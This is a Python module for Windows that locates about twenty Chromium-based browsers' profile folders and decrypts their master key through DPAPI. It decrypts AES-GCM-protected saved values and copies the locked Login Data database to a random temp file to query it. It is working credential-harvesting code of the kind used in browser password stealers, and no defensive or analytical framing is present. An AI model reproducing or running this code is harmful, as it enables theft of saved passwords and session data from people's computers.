
# Import modules
import os
from json import loads as json_loads
from base64 import b64decode
from shutil import copy2
from sqlite3 import connect as sql_connect
from string import ascii_lowercase
from random import choice, randint
from datetime import datetime

try:
    from Crypto.Cipher import AES # pip install pycryptodome
except ImportError:
    print("Please run: pip install pycryptodome")
    raise SystemExit

# Appdata path
__la = os.getenv("LOCALAPPDATA") + '\\'
__da = os.getenv("APPDATA") + '\\'
# Time
__EPOCH_AS_FILETIME = 116444736000000000  # January 1, 1970 as MS file time
__HUNDREDS_OF_NANOSECONDS = 10000000

# Change encoding to UTF8
os.system("@chcp 65001 1>nul")
# Import modules
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer



# DATA BLOB
class __DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

# Get data
def __get_data(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

""" Decrypt bytes using DPAPI """
def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in      = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in        = __DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy   = __DATA_BLOB(len(entropy), buffer_entropy)
    blob_out       = __DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None,
        None, 0x01, byref(blob_out)):
        return __get_data(blob_out)




""" Get browsers install path """
def GetBrowsers():
    browsers = []
    for __browser in __browsers_path:
        if os.path.exists(__browser):
            browsers.append(__browser)
    return browsers

""" Decrypt payload """
def __DecryptPayload(cipher, payload):
    return cipher.decrypt(payload)

""" Generate cipher """
def __GenerateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

""" Receive master-key """
def GetMasterKey(browserPath):
    fail = True
    for i in range(4):
        path = browserPath + "\\.." * i + "\\Local State"
        if os.path.exists(path):
            fail = False
            break
    if fail:
        return None
    with open(path, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json_loads(local_state)
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key =CryptUnprotectData(master_key)
    return master_key

""" Decrypt value """
def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts == "v10" or starts == "v11":
        iv = buff[3:15]
        payload = buff[15:]
        cipher = __GenerateCipher(master_key, iv)
        decrypted_pass = __DecryptPayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    else:
        decrypted_pass = CryptUnprotectData(buff)
        return decrypted_pass

""" Get data from database """
def FetchDataBase(target_db, sql=''):
    # If db not exists
    if not os.path.exists(target_db):
        return []
    # Making a temp copy since Login Data DB is locked while Chrome is running
    tmpDB = os.getenv("TEMP") + "info_" + ''.join(choice(ascii_lowercase) for i in range(randint(10, 20))) + ".db"
    copy2(target_db, tmpDB)
    # Get data from database
    conn = sql_connect(tmpDB)
    cursor = conn.cursor()
    cursor.execute(sql)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    # Remove
    try:
        os.remove(tmpDB)
    except Exception as e:
        print(e)

    return data

""" Convert ms time stamp to date """
def ConvertDate(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - __EPOCH_AS_FILETIME) / __HUNDREDS_OF_NANOSECONDS)
    return utc.strftime("%Y-%m-%d %H:%M:%S")

""" Browsers path's """
__browsers_path = (
    f"{__la}Google\\Chrome\\User Data\\Default",
    f"{__la}Google(x86)\\Chrome\\User Data\\Default",
    f"{__la}Chromium\\User Data\\Default",
    f"{__da}Opera Software\\Opera Stable",
    f"{__la}Amigo\\User Data\\Default",
    f"{__la}Vivaldi\\User Data\\Default",
    f"{__la}Orbitum\\User Data\\Default",
    f"{__la}Mail.Ru\\Atom\\User Data\\Default",
    f"{__la}Kometa\\User Data\\Default",
    f"{__la}Comodo\\Dragon\\User Data\\Default",
    f"{__la}Torch\\User Data\\Default",
    f"{__la}Comodo\\User Data\\Default",
    f"{__la}360Browser\\Browser\\User Data\\Default",
    f"{__la}Maxthon3\\User Data\\Default",
    f"{__la}K-Melon\\User Data\\Default",
    f"{__la}Sputnik\\Sputnik\\User Data\\Default",
    f"{__la}Nichrome\\User Data\\Default",
    f"{__la}CocCoc\\Browser\\User Data\\Default",
    f"{__la}Uran\\User Data\\Default",
    f"{__la}Chromodo\\User Data\\Default"
)